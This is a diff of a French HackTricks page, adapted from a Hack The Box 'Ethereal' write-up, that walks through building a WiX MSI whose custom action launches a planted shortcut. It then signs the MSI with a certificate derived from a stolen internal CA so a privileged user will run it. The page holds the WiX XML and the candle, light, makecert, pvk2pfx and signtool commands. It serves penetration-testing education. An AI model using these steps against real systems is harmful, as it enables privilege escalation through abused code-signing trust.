@@ -1,12 +1,12 @@
-# Création d’un MSI avec Custom-Action et WiX
+# Créer un MSI Custom-Action avec WiX
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Cette chaîne historique de Hack The Box utilisait WiX Toolset v3 pour créer un MSI qui lançait un fichier `.lnk` préalablement placé. **Un MSI n’est pas automatiquement privilégié** : l’exécution se fait dans le contexte défini par la stratégie de Windows Installer, les attributs de la custom action et la personne qui l’installe. Dans le scénario d, l’attaquant a également volé une CA de signature approuvée et placé le MSI signé dans un dossier surveillé par un autre utilisateur.<sup>[[1]](#references)[[3]](#references)</sup>
+Cette chaîne historique de Hack The Box utilisait WiX Toolset v3 pour créer un MSI qui lançait un fichier `.lnk` préalablement placé. **Un MSI n'est pas automatiquement privilégié** : l'exécution s'effectue dans le contexte défini par la stratégie de Windows Installer, les attributs de la custom action et l'utilisateur qui l'installe. Dans le scénario cité, l'attaquant avait également volé une CA de signature de confiance et placé le MSI signé dans un dossier surveillé par un autre utilisateur.<sup>[[1]](#references)[[3]](#references)</sup>
 
-Pour comprendre en détail les exemples d’utilisation des MSI WiX, il est conseillé de consulter [cette page](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Vous y trouverez différents exemples montrant l’utilisation des MSI WiX.<sup>[[2]](#references)</sup>
+Pour comprendre en détail les exemples d'utilisation des MSI WiX, il est conseillé de consulter [cette page](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Vous y trouverez différents exemples illustrant l'utilisation des MSI WiX.<sup>[[2]](#references)</sup>
 
-Le MSI exécute `C:\Users\Public\Desktop\Shortcuts\rick.lnk`. Le XML WiX v3 original est conservé ci-dessous :<sup>[[1]](#references)</sup>
+Le MSI exécute `C:\Users\Public\Desktop\Shortcuts\rick.lnk`. Le fichier XML WiX v3 original est conservé ci-dessous :<sup>[[1]](#references)</sup>
 ```html
 <?xml version="1.0"?>
 <Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
@@ -38,19 +38,19 @@ fail_here
 </Product>
 </Wix>
 ```
-`InstallerVersion` déclare la version minimale de Windows Installer et `Compressed="yes"` indique que le package est compressé. `Stage1` est différée, mais possède `Impersonate="yes"` ; elle s'exécute donc avec le token usurpé de l'utilisateur qui effectue l'installation. Dans ce scénario, le changement de privilèges provenait de l'utilisateur privilégié qui a ensuite ouvert le MSI, et non de cet attribut qui aurait accordé SYSTEM par magie.<sup>[[3]](#references)</sup>
+`InstallerVersion` déclare la version minimale de Windows Installer et `Compressed="yes"` indique que le package est compressé. `Stage1` est différée, mais possède `Impersonate="yes"` ; elle s’exécute donc avec le token usurpé de l’utilisateur qui effectue l’installation. Dans ce scénario, le changement de privilèges vient de l’utilisateur privilégié qui a ensuite ouvert le MSI, et non de cet attribut qui accorderait miraculeusement les privilèges SYSTEM.<sup>[[3]](#references)</sup>
 
-Compilez la source en objet WiX avec `candle.exe` :<sup>[[1]](#references)</sup>
+Compilez le source en objet WiX avec `candle.exe` :<sup>[[1]](#references)</sup>
 ```
 candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
 ```
-Liez cet objet à un MSI avec `light.exe`:<sup>[[1]](#references)</sup>
+Intégrez cet objet à un MSI avec `light.exe`:<sup>[[1]](#references)</sup>
 ```
 light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
 ```
 ### Étape de signature utilisée dans la chaîne d’origine
 
-Le workflow cible acceptait les packages signés par une CA interne compromise. Le write-up a dérivé un certificat de signature à partir de `MyCA.cer`/`MyCA.pvk`, créé un PFX et signé le MSI :<sup>[[1]](#references)</sup>
+Le workflow cible acceptait les packages signés par une CA interne compromise. L’article a dérivé un certificat de signature à partir de `MyCA.cer`/`MyCA.pvk`, créé un PFX et signé le MSI:<sup>[[1]](#references)</sup>
 ```powershell
 makecert.exe -n "CN=Ethereal" -pe -cy end `
 -ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
@@ -58,11 +58,11 @@ makecert.exe -n "CN=Ethereal" -pe -cy end `
 pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
 signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
 ```
-L’attaquant a ensuite placé le package signé dans `D:\DEV\MSIs` et a attendu que le workflow ou l’utilisateur privilégié l’exécute. Préservez cette condition préalable lors de l’adaptation de la technique : sans chemin d’installation élevé, stratégie non sécurisée telle que `AlwaysInstallElevated`, ou victime privilégiée, ce package s’exécute uniquement avec les droits de l’utilisateur actuel.
+L'attaquant a ensuite placé le package signé dans `D:\DEV\MSIs` et attendu que le workflow/l'utilisateur privilégié l'exécute. Conservez cette condition préalable lors de l'adaptation de la technique : sans un chemin d'installation élevé, une policy dangereuse telle que `AlwaysInstallElevated` ou une victime privilégiée, ce package s'exécute uniquement avec les droits de l'utilisateur actuel.
 
 ## References
 
-- [1] [Hack The Box - Ethereal : Créer un msi malveillant et obtenir root - Blog de 0xRick](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
-- [2] [Une brève introduction : créer un installateur MSI avec WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
-- [3] [Microsoft Learn — Actions personnalisées à exécution différée (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
+- [1] [Hack The Box - Ethereal : Création d'un MSI malveillant et obtention de root - Blog de 0xRick](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
+- [2] [Une introduction rapide : créer un installateur MSI avec WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
+- [3] [Microsoft Learn — Custom actions à exécution différée (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
 {{#include ../../banners/hacktricks-training.md}}
